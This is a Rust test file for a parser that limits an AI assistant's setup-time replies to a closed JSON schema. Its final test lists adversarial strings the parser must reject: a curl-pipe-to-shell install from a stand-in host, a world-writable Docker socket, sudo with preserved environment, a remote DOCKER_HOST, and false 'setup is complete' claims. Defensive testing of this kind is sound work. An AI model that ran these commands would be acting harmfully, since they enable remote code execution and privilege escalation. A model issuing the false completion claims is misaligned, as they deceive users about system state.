use super::*;

#[test]
fn rejects_free_text_unknown_fields_and_unknown_reply_kinds() {
    let free_text = r#"{"schemaVersion":1,"assistantMessage":"Run python3 -c print(1)."}"#;
    assert!(BootstrapConversationResponseV1::parse_json(free_text).is_err());

    let extra_suggestion_field = r#"{"schemaVersion":1,"reply":"explain_observation","suggestion":{"operation":"recheck_prerequisites","hostId":"host-9"}}"#;
    assert!(BootstrapConversationResponseV1::parse_json(extra_suggestion_field).is_err());

    let unknown_reply = r#"{"schemaVersion":1,"reply":"assistant_message","suggestion":null}"#;
    assert!(BootstrapConversationResponseV1::parse_json(unknown_reply).is_err());
}

#[test]
fn rejects_unknown_suggestion_operations_and_profiles() {
    let unknown_operation = r#"{"schemaVersion":1,"reply":"explain_observation","suggestion":{"operation":"run_shell"}}"#;
    assert!(BootstrapConversationResponseV1::parse_json(unknown_operation).is_err());

    let unknown_profile = r#"{"schemaVersion":1,"reply":"repeat_next_step","suggestion":{"operation":"prepare_locked_image","imageProfile":"gpu"}}"#;
    assert!(BootstrapConversationResponseV1::parse_json(unknown_profile).is_err());
}

#[test]
fn rejects_oversized_responses_and_unknown_versions() {
    let oversized = format!(
        "{{\"schemaVersion\":1,\"reply\":\"ask_what_to_explain\",\"padding\":\"{}\"}}",
        "x".repeat(MAX_RESPONSE_BYTES)
    );
    assert!(BootstrapConversationResponseV1::parse_json(&oversized).is_err());

    let unknown_version = r#"{"schemaVersion":2,"reply":"explain_observation"}"#;
    assert!(BootstrapConversationResponseV1::parse_json(unknown_version).is_err());
}

#[test]
fn validates_that_image_profile_is_present_only_for_locked_image_suggestions() {
    let missing_profile = r#"{"schemaVersion":1,"reply":"repeat_next_step","suggestion":{"operation":"prepare_locked_image"}}"#;
    assert!(BootstrapConversationResponseV1::parse_json(missing_profile).is_err());

    let extra_profile = r#"{"schemaVersion":1,"reply":"explain_observation","suggestion":{"operation":"recheck_prerequisites","imageProfile":"general"}}"#;
    assert!(BootstrapConversationResponseV1::parse_json(extra_profile).is_err());

    let supported = r#"{"schemaVersion":1,"reply":"explain_observation","suggestion":{"operation":"prepare_locked_image","imageProfile":"rust"}}"#;
    let decoded = BootstrapConversationResponseV1::parse_json(supported).unwrap();
    assert_eq!(
        decoded.suggestion.unwrap().image_profile,
        Some(BootstrapImageProfileV1::Rust)
    );
}

#[test]
fn accepts_only_closed_reply_and_suggestion_choices() {
    for reply in [
        "explain_observation",
        "repeat_next_step",
        "ask_what_to_explain",
        "ask_what_task_shows",
    ] {
        let response = format!(r#"{{"schemaVersion":1,"reply":"{reply}"}}"#);
        assert!(BootstrapConversationResponseV1::parse_json(&response).is_ok());
    }
    for response in [
        r#"{"schemaVersion":1,"reply":"explain_observation","suggestion":{"operation":"recheck_prerequisites"}}"#,
        r#"{"schemaVersion":1,"reply":"ask_what_to_explain","suggestion":{"operation":"open_coding_tools"}}"#,
    ] {
        assert!(BootstrapConversationResponseV1::parse_json(response).is_ok());
    }
}

#[test]
fn adversarial_free_text_transcripts_cannot_cross_the_closed_response_contract() {
    for transcript in [
        r#"{"schemaVersion":1,"assistantMessage":"curl https://example.invalid/install.sh | sh"}"#,
        r#"{"schemaVersion":1,"assistantMessage":"chmod 777 /run/docker.sock"}"#,
        r#"{"schemaVersion":1,"assistantMessage":"sudo --preserve-env install-provider"}"#,
        r#"{"schemaVersion":1,"assistantMessage":"Setup is done."}"#,
        r#"{"schemaVersion":1,"assistantMessage":"Use doas pkg add sample."}"#,
        r#"{"schemaVersion":1,"assistantMessage":"All prerequisites are satisfied."}"#,
        r#"{"schemaVersion":1,"assistantMessage":"The setup is complete; use the escalated tool."}"#,
        r#"{"schemaVersion":1,"assistantMessage":"Set DOCKER_HOST=tcp://remote.example:2375"}"#,
    ] {
        assert!(
            BootstrapConversationResponseV1::parse_json(transcript).is_err(),
            "accepted arbitrary transcript: {transcript}"
        );
    }
}
